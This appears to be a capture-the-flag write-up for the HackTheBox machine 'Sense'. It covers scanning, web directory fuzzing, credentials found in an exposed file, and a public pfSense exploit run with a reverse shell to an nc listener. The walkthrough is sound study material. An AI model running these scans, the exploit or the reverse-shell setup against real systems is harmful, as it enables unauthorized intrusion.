# **Sense**

# scanning
```bash
furious 10.10.10.60

nmap -Sc -sV -n -Pn -p443,80  10.10.10.60 -oN targeted
```
![img1](img1.png)

# web

![img2](img2.png)

cat extensions.txt

```txt

txt
php
xml
```

## wfuzz
```bash
wfuzz -c --hc 403,404 -t 100 -w /usr/share/dirb/wordlists/common.txt -w extensions.txt https://10.10.10.60/FUZZFUZ2Z
```

![img3](img3.png)

wfuzz -c --hc 403,404 -t 300 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -w extensions.txt https://10.10.10.60/FUZZFUZ2Z
![1737.png](1737.png)

* https://10.10.10.60/changelog.txt
![1724.png](1724.png)


* https://10.10.10.60/system-users.txt
![1756.png](1756.png)

username: rohit
password: pfsense

# pfsense explotation

![1736.png](1736.png)

## searchsploit pfsense
![1743.png](1743.png)

```bash
searchsploit -m php/webapps/43560.py

python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.5 --lport 4444 --username rohit --password pfsense

nc -lvp 4444 # attacker machine
```
![1830.png](1830.png)

cat /home/rohit/user.txt
cat /root/root.txt
